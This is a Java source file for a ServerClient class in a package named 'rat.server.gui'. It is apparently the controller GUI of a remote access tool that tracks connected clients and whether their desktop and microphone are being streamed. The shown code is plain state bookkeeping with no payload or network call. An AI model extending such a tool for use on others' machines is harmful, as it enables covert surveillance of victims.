package de.sogomn.rat.server.gui;

import javafx.beans.property.SimpleBooleanProperty;
import javafx.beans.property.SimpleStringProperty;
import de.sogomn.rat.ActiveClient;

public final class ServerClient {
	
	private final SimpleStringProperty name, os, version;
	private final SimpleBooleanProperty streamingDesktop, streamingVoice;
	
	private boolean loggedIn;
	
	private DisplayPanel displayPanel;
	private FileTreePanel treePanel;
	
	final ActiveClient client;
	
	public ServerClient(final ActiveClient client) {
		this.client = client;
		
		name = new SimpleStringProperty();
		os = new SimpleStringProperty();
		version = new SimpleStringProperty();
		streamingDesktop = new SimpleBooleanProperty();
		streamingVoice = new SimpleBooleanProperty();
		
		displayPanel = new DisplayPanel();
		treePanel = new FileTreePanel();
	}
	
	public void logIn(final String name, final String os, final String version) {
		this.name.set(name);
		this.os.set(os);
		this.version.set(version);
		
		loggedIn = true;
		
		displayPanel.setTitle(name);
		treePanel.setTitle(name);
	}
	
	public void setStreamingDesktop(final boolean streamingDesktop) {
		this.streamingDesktop.set(streamingDesktop);
	}
	
	public void setStreamingVoice(final boolean streamingVoice) {
		this.streamingVoice.set(streamingVoice);
	}
	
	public void setController(final IGuiController controller) {
		displayPanel.setController(controller);
		treePanel.setController(controller);
	}
	
	public String getName() {
		return name.get();
	}
	
	public String getAddress() {
		return client.getAddress();
	}
	
	public String getOs() {
		return os.get();
	}
	
	public String getVersion() {
		return version.get();
	}
	
	public boolean isLoggedIn() {
		return loggedIn;
	}
	
	public boolean isStreamingDesktop() {
		return streamingDesktop.get();
	}
	
	public boolean isStreamingVoice() {
		return streamingVoice.get();
	}
	
	public DisplayPanel getDisplayPanel() {
		return displayPanel;
	}
	
	public FileTreePanel getTreePanel() {
		return treePanel;
	}
	
}
